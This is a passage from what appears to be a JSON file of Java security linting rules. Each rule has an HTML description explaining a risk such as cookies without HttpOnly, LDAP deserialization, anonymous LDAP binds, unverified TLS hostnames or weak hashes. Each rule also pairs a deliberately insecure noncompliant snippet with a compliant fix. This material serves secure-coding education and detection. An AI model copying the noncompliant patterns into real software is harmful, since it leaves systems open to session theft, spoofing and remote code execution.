and DSA (Digital Signature Algorithm)</h4>\n<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>\n<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of\n<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>\n<h4>AES (Advanced Encryption Standard)</h4>\n<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying\nall possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.\nTherefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>\n<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>\n<h4>Elliptic Curve Cryptography (ECC)</h4>\n<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve\nalgorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>\n<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>\n<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve\nparameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves\ncurrently include:</p>\n<ul>\n  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>\n  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>\n  <li> Curve448. </li>\n  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>\n</ul>\n<h3>Going the extra mile</h3>\n<h4>Pre-Quantum Cryptography</h4>\n<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep\nin mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or\n\"post-quantum\") counterpart.</p>\n<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>\n<p><a href=\"https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation\">Learn more here</a>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> Documentation\n    <ul>\n      <li> NIST Documentation - <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf\">NIST SP 800-186: Recommendations\n      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>\n      <li> IETF - <a href=\"https://datatracker.ietf.org/doc/html/rfc5639\">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and\n      Curve Generation</a> </li>\n    </ul>  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S3330": {
        "name": "Creating cookies without the \"HttpOnly\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will\nbe able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer\nto decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target\nthe theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS\nvulnerability to steal session-cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>\n  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)\n  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /\n  sensitive-security cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>If you create a security-sensitive cookie in your JAVA code:</p>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);\nc.setHttpOnly(false);  // Sensitive: this sensitive cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<p>By default the <a href=\"https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setHttpOnly(boolean)\"><code>HttpOnly</code></a> flag is\nset to <em>false:</em></p>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);  // Sensitive: this sensitive cookie is created with the httponly flag not defined (by default set to false) and so it can be stolen easily in case of XSS vulnerability\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);\nc.setHttpOnly(true); // Compliant: this sensitive cookie is protected against theft (HttpOnly=true)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/HttpOnly\">OWASP HttpOnly</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1004\">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE\">HTTPONLY_COOKIE</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "java:S4434": {
        "name": "Allowing deserialization of LDAP objects is security-sensitive",
        "htmlDesc": "<p>JNDI supports the deserialization of objects from LDAP directories, which can lead to remote code execution.</p>\n<p>This rule raises an issue when an LDAP search query is executed with <code>SearchControls</code> configured to allow deserialization.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application connects to an untrusted LDAP directory. </li>\n  <li> User-controlled objects can be stored in the LDAP directory. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to disable deserialization of LDAP objects.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nDirContext ctx = new InitialDirContext();\n// ...\nctx.search(query, filter,\n        new SearchControls(scope, countLimit, timeLimit, attributes,\n            true, // Noncompliant; allows deserialization\n            deref));\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDirContext ctx = new InitialDirContext();\n// ...\nctx.search(query, filter,\n        new SearchControls(scope, countLimit, timeLimit, attributes,\n            false, // Compliant\n            deref));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> <a href=\"https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf\">BlackHat\n  presentation</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#LDAP_ENTRY_POISONING\">LDAP_ENTRY_POISONING</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S2257": {
        "name": "Using non-standard cryptographic algorithms is security-sensitive",
        "htmlDesc": "<p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has\nbeen protected. Standard algorithms like <code>SHA-256</code>, <code>SHA-384</code>, <code>SHA-512</code>, …​ should be used instead.</p>\n<p>This rule tracks creation of <code>java.security.MessageDigest</code> subclasses.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a standard algorithm instead of creating a custom one. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic class MyCryptographicAlgorithm extends MessageDigest {\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nMessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST\">MessageDigest is Custom</a>\n  </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S2254": {
        "name": "\"HttpServletRequest.getRequestedSessionId()\" should not be used",
        "htmlDesc": "<p>This function uses a session ID that is supplied by the client. Because of this, the ID may not be valid or might even be spoofed.</p>\n<h2>Why is this an issue?</h2>\n<p>According to the API documentation of the <code>HttpServletRequest.getRequestedSessionId()</code> method:</p>\n<blockquote>\n  <p>Returns the session ID specified by the client. This may not be the same as the ID of the current valid session for this request. If the client\n  did not specify a session ID, this method returns null.</p>\n</blockquote>\n<p>The session ID it returns is either transmitted through a cookie or a URL parameter. This allows an end user to manually update the value of this\nsession ID in an HTTP request.</p>\n<p>Due to the ability of the end-user to manually change the value, the session ID in the request should only be used by a servlet container (e.g.\nTomcat or Jetty) to see if the value matches the ID of an existing session. If it does not, the user should be considered unauthenticated.</p>\n<h3>What is the potential impact?</h3>\n<p>Using a client-supplied session ID to manage sessions on the server side can potentially have an impact on the security of the application.</p>\n<h4>Impersonation (through session fixation)</h4>\n<p>If an attacker succeeds in fixing a user’s session to a session identifier that they know, then they can impersonate this victim and gain access to\ntheir account without providing valid credentials. This can result in unauthorized actions, such as modifying personal information, making\nunauthorized transactions, or even performing malicious activities on behalf of the victim. An attacker can also manipulate the victim into performing\nactions they wouldn’t normally do, such as revealing sensitive information or conducting financial transactions on the attacker’s behalf.</p>\n<h2>How to fix it in Java EE</h2>\n<h3>Code examples</h3>\n<p>In both examples, a session ID is used to check whether a user’s session is still active. In the noncompliant example, the session ID supplied by\nthe user is used. In the compliant example, the session ID defined by the server is used instead.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nif (isActiveSession(request.getRequestedSessionId())) { // Noncompliant\n    // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nif (isActiveSession(request.getSession().getId())) {\n    // ...\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The noncompliant example uses <code>HttpServletRequest.getRequestedSessionId()</code> to retrieve a session ID. This ID is then used to verify if\nthe given session is still active. As this value is given by a user, this value is not guaranteed to be a valid ID.</p>\n<p>The compliant example instead uses the server’s session ID to verify if the session is active. Additionally, <code>getSession()</code> will create\na new session if the user’s request does not contain a valid ID.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Jakarta EE Documentation - <a\n  href=\"https://jakarta.ee/specifications/platform/10/apidocs/jakarta/servlet/http/httpservletrequest#getRequestedSessionId--\"><code>HttpServletRequest</code> - <code>getRequestedSessionId</code></a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/807\">CWE-807 - Reliance on Untrusted Inputs in a Security Decision</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S4433": {
        "name": "LDAP connections should be authenticated",
        "htmlDesc": "<p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The\n<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>\n<ul>\n  <li> <em>Anonymous</em> Authentication </li>\n  <li> <em>Unauthenticated</em> Authentication </li>\n  <li> <em>Name/Password</em> Authentication </li>\n</ul>\n<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing\ncredentials.</p>\n<h2>Why is this an issue?</h2>\n<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do\nnot provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted\ndirectory.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact\nvaries depending on the permission obtained on the directory and the type of data it stores.</p>\n<h4>Authentication bypass</h4>\n<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data\nsuch as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the\naffected directory as an identity provider.</p>\n<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>\n<h4>Sensitive information leak</h4>\n<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces\nof information.</p>\n<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to\nperform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>\n<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements\nin some countries. For example, this kind of security event would go against the European GDPR law.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple\nauthentication mechanism.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n// Set up the environment for creating the initial context\nHashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();\nenv.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, \"ldap://localhost:389/o=JNDITutorial\");\n\n// Use anonymous authentication\nenv.put(Context.SECURITY_AUTHENTICATION, \"none\"); // Noncompliant\n\n// Create the initial context\nDirContext ctx = new InitialDirContext(env);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n// Set up the environment for creating the initial context\nHashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();\nenv.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, \"ldap://localhost:389/o=Example\");\n\n// Use simple authentication\nenv.put(Context.SECURITY_AUTHENTICATION, \"simple\");\nenv.put(Context.SECURITY_PRINCIPAL, \"cn=local, ou=Unit, o=Example\");\nenv.put(Context.SECURITY_CREDENTIALS, getLDAPPassword());\n\n// Create the initial context\nDirContext ctx = new InitialDirContext(env);\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://datatracker.ietf.org/doc/html/rfc4513#section-5\">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication\n  Methods and Security Mechanisms</a> - Bind operations </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/521\">CWE-521 - Weak Password Requirements</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S5527": {
        "name": "Server hostnames should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability allows attackers to impersonate a trusted host.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this\nprocess, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding\nan extra layer of trust and security.</p>\n<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity\nand intercept, manipulate, or steal the data being transmitted.</p>\n<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the\napplication code would still accept it.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build\nthis trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit\nthis by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,\ntricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data\nyour system sends to them, potentially leading to significant data breaches.</p>\n<h2>How to fix it in Apache Commons Email</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled hostname validation.</p>\n<p>The hostname validation gets disabled because <code>setSSLCheckServerIdentity</code> is omitted. To enable validation, set it to\n<code>true</code>.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport org.apache.commons.mail.DefaultAuthenticator;\nimport org.apache.commons.mail.Email;\nimport org.apache.commons.mail.SimpleEmail;\n\npublic void sendMail(String message) {\n    Email email = new SimpleEmail();\n\n    email.setMsg(message);\n    email.setSmtpPort(465);\n    email.setAuthenticator(new DefaultAuthenticator(username, password));\n    email.setSSLOnConnect(true); // Noncompliant\n\n    email.send();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport org.apache.commons.mail.DefaultAuthenticator;\nimport org.apache.commons.mail.Email;\nimport org.apache.commons.mail.SimpleEmail;\n\npublic void sendMail(String message) {\n    Email email = new SimpleEmail();\n\n    email.setMsg(message);\n    email.setSmtpPort(465);\n    email.setAuthenticator(new DefaultAuthenticator(username, password));\n    email.setSSLCheckServerIdentity(true);\n    email.setSSLOnConnect(true);\n\n    email.send();\n}\n</pre>\n<h3>How does this work?</h3>\n<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root\ncause: the validity of the certificate.</p>\n<h4>Use valid certificates</h4>\n<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around\nanother system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>\n<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,\nconsider replicating its service to a server whose certificate you can change yourself.</p>\n<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>\n<ul>\n  <li> Create a self-signed certificate for that machine. </li>\n  <li> Add this self-signed certificate to the system’s trust store. </li>\n  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>\n</ul>\n<p>Here is a sample command to import a certificate to the Java trust store:</p>\n<pre>\nkeytool -import -alias myserver -file myserver.crt -keystore cacerts\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/297\">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>\n  <li> <a\n  href=\"https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms\">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nMessageDigest md1 = MessageDigest.getInstance(\"SHA\");  // Sensitive:  SHA is not a standard name, for most security providers it's an alias of SHA-1\nMessageDigest md2 = MessageDigest.getInstance(\"SHA1\");  // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nMessageDigest md1 = MessageDigest.getInstance(\"SHA-512\"); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S4792": {
        "name": "Configuring loggers is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285\">CVE-2018-0285</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127\">CVE-2000-1127</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113\">CVE-2017-15113</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742\">CVE-2015-5742</a> </li>\n</ul>\n<p>Logs are useful before, during and after a security incident.</p>\n<ul>\n  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it\n  is the first step to prevent an attack from ever happening. </li>\n  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>\n</ul>\n<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information\nlogged and how they are logged.</p>\n<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives\n  access to them. </li>\n  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>\n  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the\n  user can perform the action as many times as he/she wants. </li>\n  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)\n  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>\n  <li> the logs are only stored locally instead of being backuped or replicated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Check that your production deployment doesn’t have its loggers in \"debug\" mode as it might write sensitive information in logs. </li>\n  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>\n  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the\n  hostname. </li>\n  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the\n  impact is known and limited. </li>\n  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the\n  service are secure too. </li>\n  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control\n  the logged information. An attacker could just repeat a logged action many times. </li>\n</ul>\n<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your\nlogs:</p>\n<ul>\n  <li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user\n  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li>\n  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user\n  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example\n  use all your storage space or compromise your log indexing service. </li>\n  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as\n  failed logins, 